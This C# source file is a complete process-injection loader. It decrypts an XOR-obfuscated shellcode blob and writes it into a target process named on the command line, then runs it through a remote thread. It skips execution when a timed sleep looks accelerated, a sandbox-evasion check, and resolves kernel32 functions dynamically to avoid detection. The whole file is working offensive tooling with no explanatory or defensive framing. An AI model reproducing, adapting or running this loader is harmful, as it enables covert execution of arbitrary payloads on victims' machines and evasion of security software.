using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using Dn.Ivk;

namespace ThreadInjection
{
    public class DELEGATES
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr OpenP(uint dwDesiredAccess, bool InheritHandle, int dwProcessId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr AllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool Write(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool Protect(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool CloseH(IntPtr hProcess);
    }

    public class Program
    {
        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public static void Main(string[] args)
        {
            byte[] key = {
                0xff, 0x40, 0x94, 0xb5, 0x54, 0xc5, 0x61, 0x19, 0x93, 0x50, 0xa5, 0x9c,
                0x6e, 0xc3, 0x12, 0xef, 0x62, 0xfa, 0x69, 0xf7, 0xec, 0xc9, 0x64, 0x7f,
                0x03, 0x0d, 0xc4, 0x2f, 0xfe, 0xa4, 0xed, 0x1f
            };
            
            byte[] shellcode =  {
                0x03, 0x08, 0x15, 0x51, 0xa4, 0x3a, 0x9e, 0xe6, 0x7b, 0x80, 0xa5, 0x9c,
                0x6e, 0x82, 0x43, 0xae, 0x32, 0xa8, 0x38, 0xa1, 0xa4, 0xf8, 0xb6, 0x1a,
                0x4b, 0x86, 0x96, 0x4f, 0xc0, 0xec, 0x66, 0x4d, 0xe7, 0x7e, 0xdc, 0x3e,
                0x06, 0xe5, 0x5f, 0x51, 0x18, 0x22, 0xf5, 0xa2, 0x26, 0xcc, 0xa5, 0xa5,
                0x28, 0xb7, 0x58, 0x3e, 0xa4, 0xf8, 0xa4, 0xd3, 0x3f, 0x6c, 0xb8, 0x2d,
                0xd2, 0x84, 0xac, 0xde, 0x36, 0x4d, 0xd5, 0xb4, 0x95, 0x27, 0x8c, 0x4b,
                0xd2, 0x01, 0x9b, 0xd4, 0xe5, 0x91, 0x32, 0xd1, 0xe9, 0xb8, 0x55, 0xbf,
                0xed, 0x19, 0x5a, 0xf4, 0x83, 0x85, 0xc4, 0x2f, 0xfe, 0xec, 0x68, 0xdf,
                0x8b, 0x2f, 0xdc, 0xb4, 0x84, 0x95, 0x5f, 0x92, 0xdb, 0x48, 0x9b, 0xd8,
                0xe5, 0x83, 0x32, 0xa6, 0x63, 0x2a, 0x8a, 0xab, 0xa4, 0x36, 0xad, 0x41,
                0x42, 0x86, 0xf0, 0xa7, 0xb6, 0xa5, 0x3b, 0x52, 0xce, 0x89, 0xdc, 0x84,
                0x94, 0x69, 0x20, 0xd8, 0x5a, 0x5d, 0xe4, 0x9d, 0xaf, 0xfb, 0xf2, 0x9a,
                0x93, 0xc4, 0x25, 0xf4, 0xa0, 0xed, 0x6c, 0x3a, 0x3a, 0xdc, 0xb1, 0xf9,
                0xa6, 0x9a, 0xa9, 0x94, 0xbf, 0x64, 0xdd, 0xb4, 0x84, 0xa3, 0x5f, 0x58,
                0x18, 0x5c, 0xed, 0xa2, 0x2a, 0x48, 0x52, 0xf3, 0x2b, 0xfb, 0xb9, 0xc9,
                0xad, 0x42, 0x60, 0xf7, 0x4b, 0x0c, 0x14, 0x6e, 0xa6, 0xe5, 0xb5, 0x41,
                0xa6, 0x1a, 0xd5, 0xed, 0x15, 0x9c, 0x20, 0x43, 0xdb, 0xd3, 0x49, 0xbc,
                0x2f, 0x91, 0xed, 0x0f, 0x3a, 0xbb, 0x30, 0xad, 0xd2, 0x81, 0xef, 0x6d,
                0xea, 0x44, 0x3b, 0xd0, 0x01, 0xf9, 0xd3, 0x57, 0x72, 0xcd, 0xda, 0xb4,
                0x54, 0xc5, 0x20, 0xa3, 0xdf, 0x27, 0x83, 0x9b, 0x91, 0x16, 0x5b, 0x28,
                0xa3, 0xfa, 0x69, 0xf7, 0xec, 0xf7, 0x2c, 0xf2, 0x96, 0x03, 0xc5, 0x2f,
                0xfe, 0x9a, 0xa1, 0x92, 0x7a, 0x7c, 0x95, 0xb5, 0x54, 0x8d, 0x50, 0xd0,
                0xd2, 0xea, 0xe0, 0x1f, 0x38, 0xc4, 0xed, 0x3a, 0x2a, 0xcb, 0xa0, 0xb6,
                0x56, 0x39, 0xd1, 0xdd, 0x55, 0xf2, 0x11, 0x7d, 0x9b, 0xc9, 0x82, 0x6b,
                0x9a, 0x60, 0xc0, 0xdd, 0x26, 0xa0, 0x00, 0x7d, 0xb3, 0x19, 0xcb, 0xf6,
                0x0b, 0xa0, 0x66, 0x86, 0x0d, 0x94, 0x49, 0xb2, 0x94, 0xac, 0x07, 0x0a,
                0x77, 0x68, 0xa0, 0x0f, 0xad, 0xd1, 0x8e, 0x7c, 0x9a, 0x33, 0xe7, 0xd3,
                0x21, 0xa9, 0x0d, 0x60, 0x93, 0x00, 0xd7, 0xf3, 0x0d, 0xa6, 0x61, 0x9c,
                0x42, 0xb3, 0x07, 0x9d, 0x89, 0xaa, 0x10, 0x16, 0x6c, 0x63, 0xc4, 0x5a,
                0x8d, 0xc1, 0x9f, 0x2c, 0xcd, 0x6e, 0xf0, 0xd9, 0x38, 0xc5
            };

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 2)

            {

                return;

            }

            Process processId;
            Process[] processName;
            IntPtr Pointer;
            IntPtr hProcess;

            if (args.Length < 1)
            {
                Console.WriteLine("\t> Missing Argument!");
                return;
            }

            if (args[0].All(char.IsDigit))
            {
                int pid = Int32.Parse(args[0]);
                processId = Process.GetProcessById(pid);
                Pointer = Gen.GetLibAddrs("kernel32.dll", "OpenProcess");
                DELEGATES.OpenP OpenP = Marshal.GetDelegateForFunctionPointer(Pointer, typeof(DELEGATES.OpenP)) as DELEGATES.OpenP;
                hProcess = OpenP(PROCESS_ALL_ACCESS, false, processId.Id);
            }
            else
            {
                processName = Process.GetProcessesByName(args[0]);
                Pointer = Gen.GetLibAddrs("kernel32.dll", "OpenProcess");
                DELEGATES.OpenP OpenP = Marshal.GetDelegateForFunctionPointer(Pointer, typeof(DELEGATES.OpenP)) as DELEGATES.OpenP;
                hProcess = OpenP(PROCESS_ALL_ACCESS, false, processName[0].Id);
            }

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("\t> OpenProcess - Failed");
                return;
            }
            else
            {
                Console.WriteLine("\t> OpenProcess - OK");
            }

            Pointer = Gen.GetLibAddrs("kernel32.dll", "VirtualAllocEx");
            DELEGATES.AllocEx AllocEx = Marshal.GetDelegateForFunctionPointer(Pointer, typeof(DELEGATES.AllocEx)) as DELEGATES.AllocEx;
            IntPtr memaddr = AllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            if (memaddr == IntPtr.Zero)
            {
                Console.WriteLine("\t> VirtualAllocEx - Failed");
                return;
            }
            else
            {
                Console.WriteLine("\t> VirtualAllocEx - OK");
                Console.WriteLine("\t> Memory Address: 0x" + memaddr.ToString("X"));
            }

            for (int i = 0; i < shellcode.Length; i++)
            {
                shellcode[i] ^= key[i % key.Length];
            }

            IntPtr lpNumberOfBytesWritten;
            Pointer = Gen.GetLibAddrs("kernel32.dll", "WriteProcessMemory");
            DELEGATES.Write Write = Marshal.GetDelegateForFunctionPointer(Pointer, typeof(DELEGATES.Write)) as DELEGATES.Write;
            bool WriteMem = Write(hProcess, memaddr, shellcode, shellcode.Length, out lpNumberOfBytesWritten);

            if (!WriteMem)
            {
                Console.WriteLine("\t> WriteProcessMemory - Failed");
                return;
            }
            else
            {
                Console.WriteLine("\t> WriteProcessMemory - OK");
            }

            uint lpflOldProtect;
            Pointer = Gen.GetLibAddrs("kernel32.dll", "VirtualProtectEx");
            DELEGATES.Protect Protect = Marshal.GetDelegateForFunctionPointer(Pointer, typeof(DELEGATES.Protect)) as DELEGATES.Protect;
            bool pagePerm = Protect(hProcess, memaddr, (UIntPtr)shellcode.Length, PAGE_EXECUTE_READ, out lpflOldProtect);

            if (!pagePerm)
            {
                Console.WriteLine("\t> VirtualProtectEx - Failed");
                return;
            }
            else
            {
                Console.WriteLine("\t> VirtualProtectEx - OK");
            }

            Pointer = Gen.GetLibAddrs("kernel32.dll", "CreateRemoteThread");
            DELEGATES.CreateThread createThread = Marshal.GetDelegateForFunctionPointer(Pointer, typeof(DELEGATES.CreateThread)) as DELEGATES.CreateThread;
            IntPtr execute = createThread(hProcess, IntPtr.Zero, 0, memaddr, IntPtr.Zero, 0, IntPtr.Zero);

            if (execute == IntPtr.Zero)
            {
                Console.WriteLine("\t> CreateRemoteThread - Failed");
                return;
            }
            else
            {
                Console.WriteLine("\t> CreateRemoteThread - OK");
            }

            Pointer = Gen.GetLibAddrs("kernel32.dll", "CloseHandle");
            DELEGATES.CloseH closeH = Marshal.GetDelegateForFunctionPointer(Pointer, typeof(DELEGATES.CloseH)) as DELEGATES.CloseH;
            bool handle = closeH(hProcess);

            if (handle)
            {
                Console.WriteLine("\t> ConsoleHandle - OK");
            }
        }
    }
}